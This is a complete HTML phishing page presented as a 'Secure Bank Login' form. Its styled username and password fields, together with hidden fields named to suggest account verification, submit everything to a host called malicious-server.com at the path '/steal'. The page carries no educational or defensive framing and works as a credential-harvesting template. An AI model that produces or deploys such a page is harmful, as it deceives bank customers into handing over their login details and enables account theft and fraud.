<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Bank Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to right, #1e3c72, #2a5298);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-box {
            background: white;
            padding: 30px;
            border-radius: 10px;
            width: 350px;
            box-shadow: 0 0 20px rgba(0,0,0,0.3);
        }

        h2 {
            text-align: center;
            color: #2a5298;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        button {
            width: 100%;
            padding: 10px;
            background: #2a5298;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="login-box">
    <h2>Secure Bank Login</h2>

    <form action="http://malicious-server.com/steal" method="POST">

        <input type="text" name="username" placeholder="User ID" required>

        <input type="password" name="password" placeholder="Password" required>

        <input type="hidden" name="token" value="verify_account">

        <input type="hidden" name="session" value="secure_login_update">

        <button type="submit">Login</button>

    </form>

</div>

</body>
</html>
